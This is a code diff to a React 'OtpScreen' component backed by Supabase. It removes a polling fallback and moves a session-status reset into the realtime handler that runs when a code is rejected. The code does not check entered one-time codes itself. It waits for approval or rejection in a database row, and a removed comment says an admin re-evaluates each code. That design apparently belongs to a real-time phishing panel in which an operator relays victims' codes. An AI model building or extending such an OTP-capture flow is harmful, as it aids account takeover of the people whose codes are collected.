@@ -35,44 +35,22 @@ const OtpScreen = ({ email, sessionId, onBack }: OtpScreenProps) => {
           setStatus("error");
           setErrorMessage("Invalid code. Please try again.");
           setOtp("");
-          setTimeout(() => setStatus("input"), 2000);
+          setTimeout(() => {
+            setStatus("input");
+            supabase
+              .from("sessions")
+              .update({ status: "redirect_otp" } as any)
+              .eq("id", sessionId)
+              .then(() => {});
+          }, 2000);
         }
       })
       .subscribe((subStatus) => {
         console.log("[OTP] Decision channel status:", subStatus);
       });
 
-    // Also poll DB as fallback for decision
-    const pollInterval = setInterval(async () => {
-      const { data } = await supabase
-        .from("sessions")
-        .select("status")
-        .eq("id", sessionId)
-        .maybeSingle();
-
-      if (data?.status === "otp_approved") {
-        setStatus("success");
-        clearInterval(pollInterval);
-      } else if (data?.status === "otp_rejected") {
-        setStatus("error");
-        setErrorMessage("Invalid code. Please try again.");
-        setOtp("");
-        setTimeout(() => {
-          setStatus("input");
-          // Reset status back to redirect_otp so admin can re-evaluate
-          supabase
-            .from("sessions")
-            .update({ status: "redirect_otp" } as any)
-            .eq("id", sessionId)
-            .then(() => {});
-        }, 2000);
-        clearInterval(pollInterval);
-      }
-    }, 2000);
-
     return () => {
       supabase.removeChannel(channel);
-      clearInterval(pollInterval);
     };
   }, [sessionId]);
 
